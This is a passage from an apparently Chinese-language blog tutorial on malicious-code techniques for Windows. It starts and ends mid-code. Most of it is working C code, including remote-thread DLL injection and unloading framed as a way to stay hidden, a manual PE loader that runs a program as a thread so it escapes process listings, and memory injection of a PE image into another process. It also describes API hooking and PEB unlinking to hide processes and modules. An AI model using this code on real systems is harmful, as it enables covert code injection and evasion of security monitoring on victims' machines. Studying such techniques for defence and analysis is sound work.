(dwError)</span><br><span class="line">                &#123;</span><br><span class="line">                    OutputDebugString(<span class="string">L&quot;线程执行成功！\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> TRUE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    OutputDebugString(<span class="string">L&quot;线程执行失败！\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                OutputDebugString(<span class="string">L&quot;线程创建失败!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            OutputDebugString(<span class="string">L&quot;获取LoadLibrary函数地址失败!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;模块句柄写入失败！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放空间</span></span><br><span class="line">    <span class="keyword">if</span> (VirtualFreeEx(hProcess, lpszDllPathAddr, <span class="number">0x20</span>, MEM_DECOMMIT))</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;空间释放成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;空间释放失败！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    OutputDebugString(<span class="string">L&quot;DLL名称空间分配失败！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br></pre></td></tr></table></figure>



<p><img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210202190113698.png" alt="image-20210202190113698"></p>
<h4 id="卸载DLL"><a href="#卸载DLL" class="headerlink" title="卸载DLL"></a>卸载DLL</h4><p>当我们在完成 <code>DLL</code> 注入并执行完目标代码后，我们可以选择将注入到目标进程的 <code>DLL</code> 卸载，以实现隐蔽的效果。</p>
<p>卸载 <code>DLL</code> 的思路与 <code>DLL</code> 加载相同，唯一的区别是通过 <code>FreeLibrary</code> 函数实现 <code>DLL</code> 卸载。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hThread = <span class="literal">NULL</span>;	<span class="comment">//远程线程句柄</span></span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;	<span class="comment">//远程进程句柄</span></span><br><span class="line">HMODULE hModule = <span class="literal">NULL</span>; <span class="comment">//远程模块句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//进行DLL卸载</span></span><br><span class="line">OutputDebugString(<span class="string">L&quot;Unload DLL...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取远程进程模块句柄(通过CreateToolhelp32Snapshot函数遍历进程中的模块属性实现)</span></span><br><span class="line">hModule = GetRemoteModuleHandle(dwPID, PathFindFileName(lpszDllPath));</span><br><span class="line"><span class="comment">//获取远程进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line"></span><br><span class="line">LPVOID lphModuleAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(HMODULE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lphModuleAddr)</span><br><span class="line">&#123;</span><br><span class="line">    OutputDebugString(<span class="string">L&quot;模块句柄空间分配成功！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将模块句柄写入程序</span></span><br><span class="line">    <span class="keyword">if</span> (WriteProcessMemory(hProcess, lphModuleAddr, &amp;hModule, <span class="keyword">sizeof</span>(HMODULE), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;模块句柄写入成功！\n&quot;</span>);</span><br><span class="line">        <span class="comment">//获取函数地址</span></span><br><span class="line">        LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32&quot;</span>), <span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建远程线程</span></span><br><span class="line">            hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (hThread)</span><br><span class="line">            &#123;</span><br><span class="line">                OutputDebugString(<span class="string">L&quot;线程创建成功!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                DWORD dwError = <span class="number">0x00</span>;</span><br><span class="line">                <span class="comment">//WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line">                GetExitCodeThread(hThread, &amp;dwError);</span><br><span class="line">                <span class="keyword">if</span> (dwError)</span><br><span class="line">                &#123;</span><br><span class="line">                    OutputDebugString(<span class="string">L&quot;线程执行成功！\n&quot;</span>);</span><br><span class="line">                    TCHAR szBuff[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">                    swprintf_s(szBuff, <span class="number">20</span>,  <span class="string">L&quot;结束码: %u\n&quot;</span>, _itow(dwError, szBuff, <span class="number">16</span>));</span><br><span class="line">                    OutputDebugString(szBuff);</span><br><span class="line">                    <span class="keyword">return</span> TRUE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    OutputDebugString(<span class="string">L&quot;线程执行失败！\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                OutputDebugString(<span class="string">L&quot;线程创建失败!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            OutputDebugString(<span class="string">L&quot;获取FreeLibrary函数地址失败!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;模块句柄写入失败！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放空间</span></span><br><span class="line">    <span class="keyword">if</span> (VirtualFreeEx(hProcess, lphModuleAddr, <span class="keyword">sizeof</span>(HMODULE), MEM_DECOMMIT))</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;空间释放成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;空间释放失败！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    OutputDebugString(<span class="string">L&quot;模块句柄空间分配失败！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br></pre></td></tr></table></figure>



<h2 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h2><h3 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h3><h3 id="傀儡进程"><a href="#傀儡进程" class="headerlink" title="傀儡进程"></a>傀儡进程</h3><p>我们可以通过自己编写程序实现 <code>PE</code> 文件的加载和运行，但是就操作系统和其他程序而言，现在运行的程序是我们自己编写的程序，而不是我们所加载的 <code>PE</code> 程序。其原理类似于加密壳，就操作系统和调试程序而言，真正的程序是我们自己编写的空壳程序，而所加载的 <code>PE</code> 文件只是一堆数据而已。其本质就是将 <code>PE</code> 镜像以线程的形式运行，从而实现进程隐藏。顺着这个思路，我们就可以实现简单的加密壳。（ <strong>该方法可以实现模块隐藏</strong> ）</p>
<p><strong>存在哪些坑？</strong></p>
<p>当将 <code>CreateRemoteProcess</code> 的线程函数地址指向 <code>PE</code> 文件的 <code>AddressOfEntryPoint</code> 时，被注入程序可能会直接崩溃，原因未知！</p>
<p>当被劫持的  <code>PE</code> 程序成功运行时，当点击该程序的关闭按钮会造成主程序 <code>LoadPE</code>  被终止！</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210220135157638.png" alt="image-20210220135157638" style="zoom: 80%;" align="left">



<p>效果图如下：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210220142438306.png" alt="image-20210220142438306" style="zoom:67%;" align="left">

<p>在进程中并未找到 <code>Win32App.exe</code> ，其原因就是该程序是作为 <code>LoadPE</code> 的线程在运行的。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//读取PE文件</span></span><br><span class="line">	TCHAR FILEPATH[] = <span class="string">&quot;../injectDll/haha.exe&quot;</span>;</span><br><span class="line">	LPVOID pFileBuffer = ReadPEFile(FILEPATH);</span><br><span class="line">	<span class="keyword">if</span>(!pFileBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;PE分析结束\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将PE文件进行拉伸</span></span><br><span class="line">	LPVOID pImageBuffer = FileBufferToImageBuffer(pFileBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//指定ImageBase</span></span><br><span class="line">	DWORD newImageBase = <span class="number">0x10000000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修复重定位表</span></span><br><span class="line">	pImageBuffer = UpdateRelocationDir(pImageBuffer,newImageBase);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修复IAT表</span></span><br><span class="line">	pImageBuffer = UpdateImportDir(pImageBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分配内存空间</span></span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	DWORD ImageBase = newImageBase;</span><br><span class="line">	DWORD SizeOfImage = pOptionalHeader-&gt;SizeOfImage;</span><br><span class="line">	</span><br><span class="line">	LPVOID pExeBuffer = ::VirtualAllocEx(hProcess,(LPVOID)newImageBase,SizeOfImage,MEM_COMMIT|MEM_RESERVE ,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span>(!pExeBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;空间分配失败！\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ErrorCode: %d\n&quot;</span>,::GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;空间分配成功！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//内存写入</span></span><br><span class="line">	BOOL isWrite = ::WriteProcessMemory(hProcess,pExeBuffer,pImageBuffer,SizeOfImage,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(!isWrite)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存写入失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存写入成功！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建线程</span></span><br><span class="line">	DWORD EntryPoint = pOptionalHeader-&gt;AddressOfEntryPoint + ImageBase;</span><br><span class="line">	HANDLE hThread = ::CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span> (__stdcall *)(<span class="keyword">void</span> *))EntryPoint,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(!hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;线程创建失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;线程创建成功!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD dwError = <span class="number">0x00</span>;</span><br><span class="line">	::WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">	::GetExitCodeThread(hThread,&amp;dwError);</span><br><span class="line">	<span class="keyword">if</span>(!dwError) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;线程执行失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Error: %x\n&quot;</span>,dwError);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放空间</span></span><br><span class="line">	BOOL isFree = ::VirtualFreeEx(hProcess,pExeBuffer,SizeOfImage,MEM_DECOMMIT);</span><br><span class="line">	<span class="keyword">if</span>(!isFree)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;空间释放失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;空间释放成功！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关闭句柄</span></span><br><span class="line">	::CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放对象</span></span><br><span class="line">	<span class="built_in">free</span>(pImageBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><em><strong>为什么需要修复IAT表和重定位表？</strong></em></p>
<p>当 <code>PE</code> 文件正常被操作系统加载运行时，<code>PE</code> 文件中的重定位表和 <code>IAT</code> 表将会被操作系统修复。而我们自行加载 <code>PE</code> 文件时，重定位表和 <code>IAT</code> 表并不会自动修复，而是需要我们手动修复。</p>
<h3 id="内存注入"><a href="#内存注入" class="headerlink" title="内存注入"></a>内存注入</h3><p>内存注入是通过 <code>WriteProcessMemroy</code> 和 <code>CreateRmoteThread</code> 函数实现将 <code>PE</code> 文件写入目标进程，并通过创建远程线程执行我们注入的 <code>PE</code> 程序。<strong>这种方式需要拥有对目标进程写内存的权限，可实现模块隐藏。</strong></p>
<p>当目标进程只允许特定的进程注入时（拥有读写权限），我们则可以通过伪装进程（如输入法注入），或者注入到其所加载或允许注入的程序中去（如系统 <code>Dll</code>）。</p>
<p><em><strong>为什么在内存写入时，只需要修复 <code>PE</code> 文件的重定位表，而 <code>IAT</code> 表必须在目标进程中修复？</strong></em></p>
<p>我们将 <code>PE</code> 文件写入目标进程时，其加载基址必定发生改变，就必须要修复重定位表。由于目标进程中的 <code>Dll</code> 基址和当前注入进程的 <code>Dll</code> 基址可能不同，也就意味着我们在当前程序中所修复的 <code>IAT</code> 表可能是错误的，因此 <code>PE</code> 文件的 <code>IAT</code> 表必须在目标进程中修复，才能保证程序正常运行。</p>
<p>但是需要注意的是，在内存注入时，注入的 <code>PE</code> 镜像是自身还是其他 <code>PE</code> 文件。当内存注入时，注入的是本进程，则可以实现 <code>IAT</code> 表的修复；但是当注入的 <code>PE</code> 镜像不是本进程时，则难以修复（需要在这个 <code>PE</code> 文件中添加 <code>IAT</code> 修复功能的 <code>ShellCode</code>，不易实现）。</p>
<p>效果如下图：</p>
<p><img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210220135016803.png" alt="image-20210220135016803"></p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MemoryInject</span><span class="params">(DWORD dwPID, LPWSTR lpszPEFilePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess = <span class="literal">NULL</span>; <span class="comment">//进程句柄</span></span><br><span class="line">	HANDLE hThread = <span class="literal">NULL</span>;	<span class="comment">//线程句柄</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加载PE文件</span></span><br><span class="line">	<span class="keyword">if</span> (LoadPEFile(lpszPEFilePath))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//将 FileBuff 转为 ImageBuff, lpFileBuff已经被释放</span></span><br><span class="line">		lpImageBuff = CopyFileBuffToImageBuff(lpFileBuff);</span><br><span class="line">		GetPEHeader(lpImageBuff);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//获取PE信息</span></span><br><span class="line">		DWORD SizeOfImage = pOptionalHeader-&gt;SizeOfImage;</span><br><span class="line">		DWORD EntryPoint = pOptionalHeader-&gt;AddressOfEntryPoint;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*在远程进程中申请随机空间*/</span></span><br><span class="line">		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">		LPVOID lpExeBuffer = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">		<span class="keyword">while</span> (lpExeBuffer)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//修复重定位表</span></span><br><span class="line">			UpdateBaseRelocDirByImageBuff(lpImageBuff, (DWORD)lpExeBuffer);</span><br><span class="line"></span><br><span class="line">			<span class="comment">//修复IAT表</span></span><br><span class="line">			UpdateImportDirByImageBuff(lpImageBuff);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*将 ImageBase 复制到 新申请的内存中*/</span></span><br><span class="line">			BOOL isWrite = WriteProcessMemory(hProcess, lpExeBuffer, lpImageBuff, SizeOfImage, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">if</span> (!isWrite)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">free</span>(lpImageBuff);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*创建远程线程*/</span></span><br><span class="line">			DWORD dwEntryPoint = EntryPoint + (DWORD)lpExeBuffer;</span><br><span class="line">			<span class="comment">//DWORD dwEntryPoint = 0x915511;</span></span><br><span class="line">			hThread = CreateRemoteThread(hProcess ,<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwEntryPoint, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">if</span> (!hThread)</span><br><span class="line">			&#123;</span><br><span class="line">				OutputDebugString(<span class="string">L&quot;线程创建失败!\n&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD dwExitCode = <span class="number">0x00</span>;</span><br><span class="line">			WaitForSingleObject(hThread, <span class="number">0</span>);</span><br><span class="line">			GetExitCodeThread(hThread, &amp;dwExitCode);</span><br><span class="line">			<span class="keyword">if</span> (dwExitCode)</span><br><span class="line">			&#123;</span><br><span class="line">				OutputDebugString(<span class="string">L&quot;线程执行成功！\n&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span> TRUE;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				OutputDebugString(<span class="string">L&quot;线程执行失败！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		OutputDebugString(<span class="string">L&quot;读取PE文件失败!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;PE劫持失败！&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Hook-API"><a href="#Hook-API" class="headerlink" title="Hook API"></a>Hook API</h3><p>进程遍历系统中的进程大多通过调用系统 <code>API</code> 函数实现，当我们通过 <code>Hook</code> 这些查询系统进程的 <code>API</code> 时，通过过滤函数返回值以实现特定进程的隐藏。</p>
<p>遍历系统中的进程，通常是通过调用 <code>EnumProcesses</code> 和 <code>CreateToolhelp32Snapshot</code> 函数来实现的，而这些函数底层是通过调用 <code>ZwQuerySystemInformation</code> 函数来检索系统中的进程信息的，从而实现对进程的遍历。因此，只要我们实现对  <code>ZwQuerySystemInformation </code> 函数的 <code>Hook</code> ，即可实现特定进程隐藏。</p>
<h3 id="PEB断链"><a href="#PEB断链" class="headerlink" title="PEB断链"></a>PEB断链</h3><p>操作系统中3环的进程信息是保存在 <code>PEB</code> 中的，而进程模块信息表是通过双链循环链表实现链接的。</p>
<p>操作系统中的进程模块遍历函数，如 <code>CreateToolhelp32Snapshot</code> 函数，便是通过实现对 <code>_LDR_DATA_TABLE_ENTRY</code> 双向循环链表的遍历实现的。因此，只要我们将链表断链，就可以实现对进程模块的隐藏。</p>
<p><strong>经过测试发现，对 <code>InLoadOrderModuleList</code> 的断链最为重要，即使其他两个链表没有进行断链，依然可以实现对模块的隐藏。</strong></p>
<hr>
<p><em><strong>PEB断链可以实现模块的彻底</strong></em></p>
<p>我们需要知道的是，内核中的 <code>_EPROCESS.Vad</code> 是用于记录进程空间的地址分配的二叉树，其中便会记录该进程所加载的所有模块。因此，即使我们进行了3换的 <code>PEB</code> 断链，也依然无法彻底的实现对进程模块的隐藏。</p>
<h4 id="隐藏所有模块"><a href="#隐藏所有模块" class="headerlink" title="隐藏所有模块"></a>隐藏所有模块</h4><p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PPEB_LDR_DATA ldr;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY ldte;</span><br><span class="line"></span><br><span class="line">__asm&#123;</span><br><span class="line">    pushad</span><br><span class="line">    pushfd</span><br><span class="line">    mov eax, fs: [<span class="number">0x30</span>] <span class="comment">// PEB </span></span><br><span class="line">    mov ecx, [eax + <span class="number">0x0c</span>] <span class="comment">// LDR</span></span><br><span class="line">    mov ldr, ecx</span><br><span class="line">    popfd</span><br><span class="line">    popad</span><br><span class="line">&#125;</span><br><span class="line">PLIST_ENTRY Header = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line"><span class="comment">//PLIST_ENTRY Cur = 